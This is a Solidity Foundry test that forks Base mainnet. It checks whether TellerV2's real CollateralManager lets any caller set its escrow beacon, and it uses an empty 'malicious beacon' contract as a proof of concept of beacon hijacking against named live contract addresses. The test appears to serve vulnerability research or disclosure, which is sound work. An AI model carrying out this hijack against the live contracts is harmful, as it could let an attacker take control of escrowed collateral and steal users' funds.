// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface ICollateralManager {
    function setCollateralEscrowBeacon(address _beacon) external;
}

interface ITellerV2 {
    function collateralManager() external view returns (address);
}

/// @dev Empty contract used only as the "malicious beacon" argument.
contract DummyBeacon {
}

contract BeaconHijackTest is Test {
    // TellerV2 on Base mainnet (proxy)
    address constant TELLER_V2 = 0x5cfD3aeD08a444Be32839bD911Ebecd688861164;

    // Candidate CollateralManager addresses under investigation
    address constant CM_OPTION_A = 0xD9149bfBfB29cC175041937eF8161600b464051B;
    address constant CM_OPTION_B = 0x714439261fFF24137b9cf79C1f564Bd8A09Ae416;

    address internal resolvedCM;
    ICollateralManager cm;

    function setUp() public {
        // ── Embedded "cast call": ask TellerV2 which CM it routes to ──
        address actualCM = ITellerV2(TELLER_V2).collateralManager();

        console.log("Forked at block:", block.number);
        console.log("TellerV2.collateralManager() =", actualCM);
        console.log("Option A =", CM_OPTION_A);
        console.log("Option B =", CM_OPTION_B);

        // Resolve against the two candidates. Fail loudly if neither matches
        // (that would mean a third deployment exists and the premise is wrong).
        require(
            actualCM == CM_OPTION_A || actualCM == CM_OPTION_B,
            "TellerV2's CollateralManager is neither Option A nor Option B"
        );

        resolvedCM = actualCM;
        cm = ICollateralManager(resolvedCM);

        console.log(
            actualCM == CM_OPTION_A
                ? "RESOLVED: Option A is the real CollateralManager"
                : "RESOLVED: Option B is the real CollateralManager"
        );
        console.log("Testing against:", resolvedCM);
    }

    function test_SetCollateralEscrowBeacon_NoAccessControl() public {
        DummyBeacon dummy = new DummyBeacon();
        address maliciousBeacon = address(dummy);

        console.log("Attempting to set malicious beacon to:", maliciousBeacon);

        // If this reverts, the protocol has access control (fixed).
        // If it succeeds, the protocol is vulnerable against the real CM.
        cm.setCollateralEscrowBeacon(maliciousBeacon);

        console.log("SUCCESS: Protocol accepted the malicious beacon.");
        console.log("The protocol is VULNERABLE to escrow beacon hijacking.");
    }
}
